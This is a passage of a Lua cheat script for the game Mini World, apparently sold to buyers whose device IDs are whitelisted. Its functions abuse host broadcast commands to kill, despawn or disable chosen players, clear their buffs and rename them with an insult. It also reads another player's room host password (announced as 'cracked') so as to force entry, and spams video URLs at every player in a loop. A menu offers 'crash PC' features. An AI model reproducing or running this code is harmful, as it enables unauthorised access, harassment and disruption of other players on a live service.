        -- Gửi lệnh gamerule tới Host
        local tdata = {}
        tdata[1] = "gamerule"
        tdata[2] = "setAllowMidwayJoin"
        tdata[3] = { value }
        
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

        -- Thông báo kết quả trực quan
        if value == 0 then
            ShowGameTipsWithoutFilter("#cFF0000Đã cấm người chơi vào phòng giữa chừng!")
        elseif value == 1 then
            ShowGameTipsWithoutFilter("#c00FF00Đã cho phép người chơi vào phòng giữa chừng!")
        end
    end)
end

-- Hàm chính được đưa lên đầu tiên
function pcyh2()
    -- Đóng giao diện menu hiện tại khi bấm
    pcall(function()
        GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
    end)

    ShowGameTipsWithoutFilter("Nhập UID người chơi cần thêm vào danh sách chặn tự động:")

    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("#cFF0000Vui lòng không để trống UID!")
            return
        end

        local targetUin = tonumber(text)
        if not targetUin then
            ShowGameTipsWithoutFilter("#cFF0000UID phải là một dãy số hợp lệ!")
            return
        end

        -- 1. KIỂM TRA DANH SÁCH TRẮNG TOÀN CỤC (whitelist)
        if whitelist and whitelist[targetUin] then
            ShowGameTipsWithoutFilter("#RKhông thể áp dụng tính năng này lên thành viên trong danh sách trắng!", 3)
            return
        end

        -- 2. Hiển thị hộp thoại xác nhận (Yes/No)
        GetInst("MessageBoxInterface"):dualBtnBox(
            "Xác nhận thêm UID: " .. targetUin .. " vào danh sách cấm tự động và xóa mục tiêu ngay lập tức?",
            "Đồng ý",
            "Hủy",
            function(result)
                -- Nếu bấm Hủy thì dừng toàn bộ lệnh, thoát ngay lập tức
                if result == 0 or result == false or result == "Hủy" then
                    ShowGameTipsWithoutFilter("#cFF0000Đã hủy thao tác! Không có lệnh nào được thực thi.")
                    return
                end

                -- Kiểm tra lại whitelist lần nữa cho an toàn tuyệt đối
                if whitelist and whitelist[targetUin] then
                    ShowGameTipsWithoutFilter("#RĐã hủy! UID này thuộc danh sách trắng bảo vệ.", 3)
                    return
                end

                -- Nếu bấm Đồng ý thì lưu vào Blacklist (Cộng dồn, không bị đè)
                local isAlreadyInList = autoDespawnBlacklist[targetUin]
                if not isAlreadyInList then
                    autoDespawnBlacklist[targetUin] = true 
                end

                -- Đếm tổng số lượng người đang bị đưa vào danh sách chặn
                local count = 0
                for _ in pairs(autoDespawnBlacklist) do
                    count = count + 1
                end

                -- Thực hiện lệnh xóa/despawn mục tiêu ngay lập tức
                local removeData = {
                    [1] = "world",
                    [2] = "despawnActor",
                    [3] = { targetUin }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, removeData)
                
                ShowGameTipsWithoutFilter("#c00FF00Đã áp dụng! UID " .. tostring(targetUin) .. " (Tổng đang chặn: " .. count .. " người)")
            end
        )
    end)
end

-- Khởi tạo danh sách đen (Blacklist) lưu trữ UID bị chặn tự động (nếu chưa có)
if not autoDespawnBlacklist then
    autoDespawnBlacklist = {}
end

-- Lắng nghe sự kiện người chơi vào phòng để tự động quét danh sách
local function onPlayerJoinCheck(eventData)
    pcall(function()
        local playerObj = eventData and (eventData.player or eventData.objPlayer)
        if playerObj and playerObj.getUin then
            local uin = playerObj:getUin()
            
            -- Nếu UIN nằm trong danh sách trắng toàn cục -> Bỏ qua, tuyệt đối an toàn
            if whitelist and whitelist[uin] then
                return
            end
            
            -- Nếu UIN nằm trong danh sách đen -> Tự động quét và thực hiện lệnh despawn
            if uin and autoDespawnBlacklist[uin] then
                local removeData = {
                    [1] = "world",
                    [2] = "despawnActor",
                    [3] = { uin }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, removeData)
            end
        end
    end)
end

function pcrh1()
    local myUin = AccountManager:getUin()

    if not myUin or myUin <= 1000 then
        ShowGameTipsWithoutFilter("#RKhông thể lấy được UIN của bạn!", 3)
        return
    end

    local tdata = {}
    tdata[1] = "player"
    tdata[2] = "setActionAttrState"
    tdata[3] = {myUin, 1, true} -- (1 là mở, 0 là đóng tùy ý bạn)
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

    ShowGameTipsWithoutFilter("#cGĐã tác động thành công cho UIN của bạn: " .. myUin, 3)
end

function pcrh2()
    -- Tự động lấy UIN của chính bạn
    local selfUin = AccountManager and AccountManager:getUin() or (Me and Me:getUin() or 0)

    if not selfUin or selfUin == 0 then
        ShowGameTipsWithoutFilter("#cFF0000Không thể lấy được UIN của bản thân!")
        return
    end

    -- Hiển thị bảng nhập giá trị góc nhìn
    ShowGameTipsWithoutFilter("Nhập giá trị góc nhìn (0: Thường, 1: Thứ nhất):")

    ShowTextInputSafe(function(text)
        if not text or text == "" then
            ShowGameTipsWithoutFilter("#cFF0000Vui lòng không để trống giá trị!")
            return
        end

        local viewMode = tonumber(text)
        if not viewMode then
            ShowGameTipsWithoutFilter("#cFF0000Giá trị góc nhìn phải là số hợp lệ!")
            return
        end

        -- Thực thi gửi gói tin thay đổi góc nhìn cho bản thân
        pcall(function()
            local tdata1 = {}
            tdata1[1] = "player"
            tdata1[2] = "changeViewMode"
            tdata1[3] = { selfUin, viewMode, false }

            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
        end)

        ShowGameTipsWithoutFilter("#c00FF00Đã đổi góc nhìn thành công: " .. tostring(viewMode))
    end)
end

-- ==================== 主菜单 ====================
function Functions(texta, gnaaa)
    local songbookv = GetInst("MiniUIManager"):GetMVC("main_songbookAutoGen")
    
    function songbookv:RefreshLeftList()
        self.view.widgets.title:setText(texta[math.random(1, #texta)])
        self.view.widgets.n7:setText("Danh Mục")
        
        -- === THÊM HIỂN THỊ GIỜ THỰC VÀO Ô n11 ===
        local thoiGianThuc = os.date("%H:%M:%S - %d/%m/%Y")
        self.view.widgets.n11:setText("Giờ: " .. thoiGianThuc)
        self.view.widgets.n11:setVisible(true)
        -- ===========================================

        self.view.widgets.n12:setVisible(false)
        self.view.widgets.n29:setVisible(false)
        self.view.widgets.randomBtn:setVisible(false)
        self.view.widgets.btn1:setTitle("Xác nhận")
        self.view.widgets.n31:setText("Tất cả chức năng đều đã được cải tiến!")
        self.view.widgets.n10:setText("    Vật dụng cầm tay id:" .. CurMainPlayer:getCurToolID())
        
        local strs = {
            "Khu chức năng 1",
            "Khu chức năng 2",
            "Khu chức năng 3",
            "Phát Nhạc",
            "Bản tăng cường Bánh Mì",
            "Bản tăng cường Bánh Mì2",
            "Bản tăng cường Bánh Mì3",
            "Kick Thiết Bị",
            "Chức năng cải tiến",
            "VIP :)",
            "Sever Clound",
            "Anti kill"
        }

        self.view.widgets.leftListView:setNumItems(#strs)

        for i = 1, #strs do
            local itemObj = self.view.widgets.leftListView:getChildAt(i - 1)
            itemObj:getChild("title"):setText(strs[i])
            itemObj:setName(i)
        end
    end
    
    function songbookv:RenderListItem2(scoreDef, itemObj, i)
        itemObj:getController("推荐乐器"):setSelectedIndex(7)
        itemObj:getChild("n16"):setText(scoreDef[1])
        itemObj:getChild("n18"):setText(scoreDef[4] or ("Số seri" .. i))
        itemObj:getChild("n19"):setText("")
        itemObj.path = scoreDef[3] or scoreDef[1]
        itemObj.audioname = scoreDef[2]
    end
    
    function songbookv:RefreshList()
        self.view.widgets.n9:setText("Số lượng chức năng:" .. #gnaaa[self.selectLeftIndex])
        self.view.widgets.listView:setNumItems(#gnaaa[self.selectLeftIndex])
        for i = 1, #gnaaa[self.selectLeftIndex] do
            local itemObj = self.view.widgets.listView:getChildAt(i - 1)
            self:RenderListItem2(gnaaa[self.selectLeftIndex][i], itemObj, i)
            itemObj:setName(i)
        end
    end
    
    function songbookv:okBtnClick(obj, context)
        local itemObj = self.view.widgets.listView:getChildAt(self.selectIndex - 1)
        if itemObj.audioname then
            threadpool:work(function() itemObj.audioname(itemObj.path) end)
            ShowGameTipsWithoutFilter("#cFF7aad" .. gnaaa[self.selectLeftIndex][self.selectIndex][1] .. "Đã bật")
        else
            ShowGameTipsWithoutFilter("#cff0000Chức năng không được phép hoặc không tồn tại")
        end
    end
    
    function songbookv:ResourceCenterClick(obj, context)
        threadpool:work(function()
            if not ResourceCenterMidiEntryIsOpen() then
                ShowGameTipsWithoutFilter(GetS(120101))
                return
            end
            GetInst("UIManager"):Open("ResourceCenter", { lockMidi = true })
        end)
    end
    
    GetInst("MiniUIManager"):OpenUI("main_songbook", "miniui/miniworld/music_roleplay", "main_songbookAutoGen")
end

-- ==================== 主菜单按钮 ====================
if CurWorld and CurMainPlayer then
    GetInst("QQMusicPlayerManager"):ShowUI()
    getglobal("AccChangeColorBtn"):Show()
    
    TaskTrackFrame = getglobal("TaskTrackFrame")
    TaskTrackFrame:Show()
    
    local titleWidget = getglobal("TaskTrackFrameTitle")
    if titleWidget then titleWidget:SetText("#cFFCC99Tính năng nâng cao") end
    
    local iconWidget = getglobal("TaskTrackFrameIcon")
    if iconWidget then SetItemIcon(iconWidget, 10500) end
    
    if TaskTrackFrame.EnableDragging then
        TaskTrackFrame:EnableDragging(true)
    end

    -- Khởi động luồng chạy đồng hồ thời gian thực chống đứng số giây
    if not _G.taskClockRunning then
        _G.taskClockRunning = true
        threadpool:work(function()
            while true do
                pcall(function()
                    local descWidget = getglobal("TaskTrackFrameDesc")
                    if descWidget then
                        descWidget:Show()
                        
                        local t = os.date("*t", os.time())
                        local gio = string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
                        local ngayThang = string.format("%02d/%02d", t.day, t.month)
                        
                        local chuoiHienThi = string.format("#RTime[%s - %s]", gio, ngayThang)
                        descWidget:SetText(chuoiHienThi, 255, 255, 255)
                    end
                end)
                os.sleep(1)
            end
        end)
    end

    getglobal("PlayMainFrameFly"):Show()
    getglobal("PlayMainFrameFly"):SetPoint("top", "PlayMainFrameFlyUp", "bottom", -80, 2)
    
    function SetMenuFrameFAQBtn()
    getglobal("SetMenuFrame"):Hide();
    
    -- 获取当前设备的ID
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not author[currentDeviceID] then
        ShowGameTipsWithoutFilter("#RNút này chỉ dành cho tác giả", 3)
        return
    end
ShowTextInputSafe(function(text)
        local raw_Uin = text
        local roomID = ""
        local hostPassword = ""
        local num_Uin = tonumber(raw_Uin)
        local query_Uin
        
        if num_Uin then
            query_Uin = num_Uin < 1000000000 and (num_Uin + 1000000000) or num_Uin
        else
            query_Uin = raw_Uin
        end
        
        local ret, data = BuddyManager:query_friend_info(query_Uin, true)
        
        if ret == 0 and type(data) == "table" then
            local statusinfo = data.statusinfo or {}
            roomID = tostring(statusinfo[2] or "")
            local roominfo_str = statusinfo[3]
            
            if type(roominfo_str) == "string" and roominfo_str ~= "" then
                local f, err = loadstring("return " .. roominfo_str)
                if f then
                    local ok, roominfo = pcall(f)
                    if ok and type(roominfo) == "table" then
                        local pwd = roominfo.hostPassword or ""
                        if type(pwd) == "string" and pwd ~= "" then
                            hostPassword = pwd
                        end
                    end
                end
            end
        end
        
        if roomID == "" then
            ShowGameTipsWithoutFilter("#cFFAAFFThông #cFFBBEEbáo #cFFCCDDhệ #cFFDDCCthống #cFFEEBB：#RNgười chơi này chưa vào phòng"..hostPassword)
        elseif string.find(roomID, "-", 1, true) ~= nil then
            ShowGameTipsWithoutFilter("#cFFAAFFThông #cFFBBEEbáo #cFFCCDDhệ #cFFDDCCthống #cFFEEBB：#RTính năng theo dõi dịch vụ đám mây không được hỗ trợ")
        else
            FriendChat_ReqFriendRoomByUin(raw_Uin, nil, true, true)
            ShowGameTipsWithoutFilter("#cFFAAFFThông #cFFBBEEbáo #cFFCCDDhệ #cFFDDCCthống #cFFEEBB：#YMật khẩu đã được bẻ khóa thành công"..hostPassword)
        end
        
        local roomDesc = GetInst("RoomService"):ReqQuickUpPlayerRoomInfo(raw_Uin)
        if roomDesc then
            roomDesc.lcl_outTime = os.time() + 1
            GetInst("RoomService"):EnterRoomByDesc(0, false, roomDesc)
        end
    end)
end
    
    
  ---------

    
      
        
          ----------自定义召唤生物  
    
    
    
 --------------------
 

function SwithLangFrame_OnShow()
	if ClientCurGame and ClientCurGame:isInGame() then
		ClientCurGame:setOperateUI(true)
	end
	local oldGetS = GetS
GetS = function(id)
    if id == 3499 then
        return "Giao diện các tính năng VIP"
    end
    return oldGetS(id)
end
getglobal("SwitchLangFrameTitleFrameName"):SetText(GetS(3499))

	if lang_now == 999 then
		lang_now = get_game_lang()
	end
	local isOversea = get_game_env() >= 10
	if isOversea then
		local lang_index
		if lang_now == 2 then
			lang_index = 0
		elseif lang_now > 2 then
			lang_index = lang_now - 1
		else
			lang_index = lang_now
		end
		getglobal("SwitchLangFrameLayout"):Hide()
		getglobal("SwitchLangFrameLayoutOversea"):Show()
		getglobal("SwitchLangFrameLayoutOverseaLang" .. lang_index):Checked()
	else
		getglobal("SwitchLangFrameLayoutOversea"):Hide()
		getglobal("SwitchLangFrameLayout"):Show()
		getglobal("SwitchLangFrameLayoutLang" .. lang_now):Checked()
	end
	setLangChecked(lang_now)
	Log("call SwithLangFrame_OnShow, lang_now=" .. lang_now)
	local column_ = 0
	local row_ = 0
	local show_cc = 0
	local hasExcepted = false
	for i = 0, 16 do
		local hide_lang = hidden_lang_list()
		for k, v in pairs(hide_lang) do
			local btn_name_prefix = "SwitchLangFrameLayoutLang"
			if isOversea then
				v = v - 1
				btn_name_prefix = "SwitchLangFrameLayoutOverseaLang"
			end
			if v == i then
				local btn_ = getglobal(btn_name_prefix .. v)
				if btn_ then
					btn_:Hide()
					hasExcepted = true
					break
				end
			end
		end
		if not hasExcepted then
			local btn_, txt_
			if isOversea then
				btn_ = getglobal("SwitchLangFrameLayoutOverseaLang" .. i)
				txt_ = getglobal("SwitchLangFrameLayoutOverseaLang" .. i .. "Tips")
			else
				btn_ = getglobal("SwitchLangFrameLayoutLang" .. i)
				txt_ = getglobal("SwitchLangFrameLayoutLang" .. i .. "Tips")
			end
			if get_game_lang() == gb_enumLang.LANGUAGE_THA and txt_ and isOversea and i ~= 0 and i ~= 6 and i ~= 7 then
				txt_:SetFontType("BlackFont35")
			end
			if btn_ then
				if isOversea then
					if GameLanguageCsv and GameLanguageCsv.idLanguage then
						if txt_ then
							local langIndex = lang_list[i + 1]
							local def = GameLanguageCsv:idLanguage(langIndex)
							local langTxt = def.name
							local canOperate = def.optional
							if tonumber(canOperate) == 0 then
								btn_:Hide()
							end
							txt_:SetText(langTxt)
						end
					elseif txt_ then
						if i == 0 then
		         txt_:SetText(GetS(3497))
						elseif i == 1 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9998 then
        return "Chống PC hạ gục tức thì"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9998))
elseif i == 2 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9997 then
        return "Làm sập PC"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9997))
elseif i == 3 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9996 then
        return "Hạ gục lặp toàn phòng"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9996))
elseif i == 4 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9995 then
        return "Hạ gục tức thì bỏ qua danh sách trắng"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9995))
elseif i == 5 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9994 then
        return "Tùy chỉnh bắn vật thể ném"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9994))
elseif i == 6 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9993 then
        return "Chỉ định C người chơi"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9993))

elseif i == 7 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9992 then
        return "Siêu hạ gục tức thì"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9992))
elseif i == 8 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9991 then
        return "Chỉ định phát quảng cáo"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9991))
						elseif i == 15 then
							txt_:SetText("Malaysia")
						else
							txt_:SetText(GetS(973 + i))
						end
					end
				elseif i < 3 then
					txt_:SetText(GetS(3495 + i))
				elseif i == 15 then
					txt_:SetText("Malaysia")
				else
					txt_:SetText(GetS(972 + i))
				end
			end
		end
		hasExcepted = hasExcepted and false
	end
	if isOversea then
		getglobal("SwitchLangFrameLayoutOversea"):UpdateLayout()
	else
		getglobal("SwitchLangFrameLayout"):UpdateLayout()
	end
	if GetInst("MiniUIManager") then
		GetInst("MiniUIManager"):PushNoMvcUIViewTemplateToHistory("SwitchLangFrame", SwithLangFrame_OnHide)
	end
end


-- ============================================================================
-- 函数名：setLangChecked
-- 功能：设置语言选择界面中当前选中语言的按钮状态（禁用/启用）
-- 参数：op - 当前选中的语言ID（数值类型）
-- 返回值：无
-- ============================================================================
function setLangChecked(op)
    -- 判断当前游戏环境是否为海外版（游戏环境ID >= 10 为海外版）
    local isOversea = get_game_env() >= 10
    
    -- ========== 海外版语言列表配置 ==========
    if isOversea then
        -- 海外版语言ID映射表（索引从0开始，与UI按钮索引对应）
        -- 注意：这里的顺序决定了按钮的排列顺序
        lang_list = {
            2,   -- 索引0：语言ID 2
            1,   -- 索引1：语言ID 1
            3,   -- 索引2：语言ID 3
            4,   -- 索引3：语言ID 4
            5,   -- 索引4：语言ID 5
            6,   -- 索引5：语言ID 6
            7,   -- 索引6：语言ID 7
            8,   -- 索引7：语言ID 8
            9,   -- 索引8：语言ID 9
            10,  -- 索引9：语言ID 10
            11,  -- 索引10：语言ID 11
            12,  -- 索引11：语言ID 12
            13,  -- 索引12：语言ID 13
            14,  -- 索引13：语言ID 14
            15,  -- 索引14：语言ID 15
            16,   -- 索引15：语言ID 16
            17
        }
        
        -- 遍历海外版语言列表，设置每个按钮的状态
        for k, v in pairs(lang_list) do
            -- 根据索引构建按钮名称（海外版按钮名称格式：SwitchLangFrameLayoutOverseaLang + 索引）
            -- 注意：k从1开始，需要减1得到0基索引
            local btn = getglobal("SwitchLangFrameLayoutOverseaLang" .. k - 1)
            
            if btn then
                -- 如果当前语言ID匹配，则禁用该按钮（表示当前选中）
                if v == op then
                    Log("v==" .. op)  -- 调试日志：匹配成功
                    btn:Enable()       -- 启用按钮（可点击）
                else
                    -- 如果不匹配，则启用并取消选中状态
                    Log("v!=" .. op)  -- 调试日志：不匹配
                    btn:Enable()       -- 启用按钮（可点击）
                    btn:DisChecked()   -- 取消选中状态（取消高亮/勾选）
                end
            end
        end
        
    -- ========== 国内版语言列表配置 ==========
    else
        -- 遍历国内版语言列表（lang_list 应该在其他地方定义）
        for k, v in pairs(lang_list) do
            -- 国内版按钮名称格式：SwitchLangFrameLayoutLang + 语言ID
            local btn = getglobal("SwitchLangFrameLayoutLang" .. v)
            
            if btn then
                -- 如果当前语言ID匹配，则禁用该按钮
                if v == op then
                    Log("v==" .. op)  -- 调试日志：匹配成功
          btn:Enable()       -- 启用按钮（可点击）
                else
                    -- 如果不匹配，则启用并取消选中状态
                    Log("v!=" .. op)  -- 调试日志：不匹配
                    btn:Enable()       -- 启用按钮（可点击）
                    btn:DisChecked()   -- 取消选中状态（取消高亮/勾选）
                end
            end
        end
    end
end



-- ============================================================================
-- 函数名：SwithLangFrame_OnClick
-- 功能：处理语言切换界面中语言按钮的点击事件
-- 参数：op - 点击的语言ID（数值类型），特殊值999表示关闭界面
-- 返回值：无
-- ============================================================================
function SwithLangFrame_OnClick(op)
    -- 打印调试日志，记录点击的语言ID和当前语言ID
    Log("call SwithLangFrame_OnClick=" .. op .. "/" .. lang_now)
    
    -- ========== 情况1：点击关闭按钮（op == 999） ==========
    if op == 999 then
        -- 直接隐藏语言切换界面，不进行任何语言切换操作
        getglobal("SwitchLangFrame"):Hide()
        
           elseif op == 1 then
        -- 执行防电脑功能
        Log("执行防电脑功能")
        ExecuteAntiBotLogic()
    -- ========== 情况2：点击的语言与当前语言相同 ==========
    elseif op == 3 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        bdn()
        
        elseif op == 4 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        xhjs()
        elseif op == 5 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        mswsbmd()
        elseif op == 6 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        zdtzw()
        elseif op == 7 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        zdcr()
        elseif op == 8 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        cjms()
        elseif op == 9 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        bfsp()
    -- ========== 情况3：点击了不同的语言 ==========
    
          
    end
end



function bfsp()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not author8[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end
    
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 全局开关，控制视频广播循环
_G.video_broadcast_loop = false

GetInst("MessageBoxInterface"):dualBtnBox(
    "左边关闭\n右边开启",
    "推送视频广播",
    nil,
    function(userData, btnType)
        if btnType == 0 then
            -- 点击关闭：开关置false，循环自动终止
            _G.video_broadcast_loop = false
            ShowGameTipsWithoutFilter("#cFF0000视频广播循环已关闭，停止发包")
        elseif btnType == 1 then
            ShowGameTipsWithoutFilter("#c00ffff开始循环推送所有白名单视频链接")
            local imgIdList = {
                "fe-test.mini1.cn/jsbridge/test.html?source=https://mnweb.mini1.cn/game/other/videos/HWah1bFHCK.mp4",
                "https://fe-test.mini1.cn/jsbridge/test.html",
                "source=https://mnweb.mini1.cn/game/other/videos/HWah1bFHCK.mp4&openBrowser=3&portrait=2",
                "https://activity.mini1.cn/game/videoplay.html?source=https://mnweb.mini1.cn/game/other/videos/HWah1bFHCK.mp4&openBrowser=3&portrait=2",
                "http://ws-mdownload.mini1.cn/party/20221010110704.mp4",
                "https://mdownload.miniworldgame.com/party/20230317112429.mp4",
                "http://mdownload.miniworldgame.com/party/20230317105638.mp4",
                "https://mdownload.miniworldgame.com/party/20230317160258.mp4",
                "https://www.youtube.com/watchv=otK1gH_0mtA&t=12s",
                "https://mdownload.miniworldgame.com/party/20230320125716.mp4",
                "https://mdownload.miniworldgame.com/party/20230320130658.mp4",
                "https://mdownload.miniworldgame.com/party/20230619110237.mp4",
                "https://mdownload.miniworldgame.com/party/20240124143704.mp4",
                "https://www.bilibili.com/video/BV1pL411v7Aw?t=35.0",
                "https://youtu.be/TnvKu0I84tI"
            }
            -- 开启循环标记
            _G.video_broadcast_loop = true
            
            -- 只遍历一次房间所有玩家，缓存全部玩家uin，不再重复调用选择界面
            local targetUinList = {}
            ShowPlayerList(function(uin)
                table.insert(targetUinList, uin)
            end, "牛逼")

            threadpool:work(function()
                -- 外层一万次循环增加开关判断
                for a = 0, 10000 do
                    -- 检测关闭标记，直接跳出所有循环
                    if not _G.video_broadcast_loop then
                        break
                    end
                    threadpool:wait(0.1)
                    for _, imgid in ipairs(imgIdList) do
                        if not _G.video_broadcast_loop then
                            break
                        end
                        -- 直接用缓存好的玩家uin列表发包，无需重复打开选择玩家界面
                        for _, uin in ipairs(targetUinList) do
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, {"player", "openVideoUrl",{uin,imgid}})
                        end
                    end
                end
                ShowGameTipsWithoutFilter("#cFF0000视频推送循环执行完毕/手动终止")
            end)
        end
    end
)
end





function cjms()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not DEVICE_AUTH_DISABLED and not author7[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 单体秒杀功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止秒杀\n右边开启秒杀并选择目标",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止秒杀 =====
            _G.dtms_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000秒杀已停止")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启秒杀 =====
            _G.dtms_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000请先进入游戏房间")
                _G.dtms_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000当前房间没有其他玩家")
                _G.dtms_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "选择秒杀目标",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要秒杀的玩家")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad玩家列表")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad点击开始秒杀")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ShowGameTipsWithoutFilter("#c00ffff已选择玩家：" .. targetUin .. "，开始无间隔1000次秒杀循环")
                
                -- 启动秒杀循环
                threadpool:work(function()
                    local myUin = AccountManager:getUin()
                    
                    while _G.dtms_enabled do
                        -- 无间隔连续执行1000次，内部不加任何wait
                        for loopCount = 1, 800 do
                            if not _G.dtms_enabled then
                                break
                            end
                            local dAttack = {
                                [1] = "gamerule",
                                [2] = "setKillNotify",
                                [3] = {true}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, dAttack)
                            end)
                            
                            
                            local diAttack = {
                                [1] = "gamerule",
                                [2] = "setScoreKillPlayer",
                                [3] = {100}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, diAttack)
                            end)
                            -- 每10次重新施加禁止攻击（防止被清除）
                            if loopCount % 10 == 1 then
                                local keepDisable = {
                                    [1] = "player",
                                    [2] = "setActionAttrState",
                                    [3] = {targetUin, 32, false}
                                }
                                pcall(function()
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                                end)
                            end
                            
                            local disableAttack = {
                                [1] = "player",
                                [2] = "forceOpenBoxUI",
                                [3] = {targetUin,797}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack)
                            end)
                            
                            
                            
                            
                            
                            
                            local setNick = {
                                [1] = "actor",
                                [2] = "setnickname",
                                [3] = {targetUin,'#R狗'}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setNick)
                            end)
                            
                            local changeModel = {
                                [1] = "actor",
                                [2] = "changeCustomModel",
                                [3] = {targetUin,[=[mob_3407]=]}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeModel)
                            end)
                            
                            local lockAttack = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin,32,false}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, lockAttack)
                            end)
                            
                            -- ===== 设置目标为可攻击状态 =====
                            local setAttackable = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = {targetUin, 64, true}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setAttackable)
                            end)
                            
                            -- ===== 清除目标无敌buff =====
                            local clearBuff = {
                                [1] = "buff",
                                [2] = "clearAllBuff",
                                [3] = {targetUin}
                            }
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)
                            end)
                            
                            -- 播放特效
                            local t1 = {
                                [1] = "actor",
                                [2] = "playBodyEffectByFile",
                                [3] = {targetUin, "jiguang01", true}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1) 
                            end)
                            
                            local t10 = {
                                [1] = "actor",
                                [2] = "playBodyEffectByFile",
                                [3] = {targetUin, "aotu_06_leishenzhichui", true}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t10) 
                            end)
                            
                            -- 设置属性
                            local t2 = {
                                [1] = "player",
                                [2] = "setAtt",
                                [3] = {targetUin, 1, 1}
                            }
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t2) 
                            end)
                            local t3 = {
                                [1] = "player",
                                [2] = "setAtt",
                                [3] = {targetUin, 1, 2}
                            }
                            pcall(function() 
